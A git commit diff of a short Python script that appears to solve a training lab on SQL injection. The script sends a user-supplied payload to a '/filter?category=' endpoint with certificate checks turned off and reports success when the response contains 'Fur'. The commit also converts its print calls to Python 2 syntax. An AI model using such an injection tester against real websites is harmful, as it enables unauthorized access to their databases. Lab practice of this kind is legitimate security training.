552ecfb05ce9a71a83918d1fc39b4bad7f37ff93
JP GOUTHAM <48644664+goutygoutham@users.noreply.github.com>
2022-10-14 11:47:43 +0800

    Update lab1-sqli.py

--- lab1-sqli.py
+++ lab1-sqli.py
@@ -1,26 +1,30 @@
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
 import requests
 import sys
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+
 def lab1_sqli(url, payload):
     uri = '/filter?category='
     r = requests.get(url + uri + payload, verify=False)
-    if "Fur" in r.text:
+    if 'Fur' in r.text:
         return True
     else:
         return False
 
-if __name__ == "__main__":
+
+if __name__ == '__main__':
     try:
         url = sys.argv[1].strip()
         payload = sys.argv[2].strip()
     except IndexError:
-        print("[*] Usage: lab1-sqli.py <url> <payload>")
-        print('[*] Example: lab1-sqli.py https://example.com "1=1"')
+        print '[*] Usage: lab1-sqli.py <url> <payload>'
+        print '[*] Example: lab1-sqli.py https://example.com "1=1"'
         sys.exit(-1)
 
     if lab1_sqli(url, payload):
-        print("[*]Boom[*] SQL injection successful!")
+        print '[*]Boom[*] SQL injection successful!'
     else:
-        print(" :-( SQL injection unsuccessful!")
+        print ' :-( SQL injection unsuccessful!'
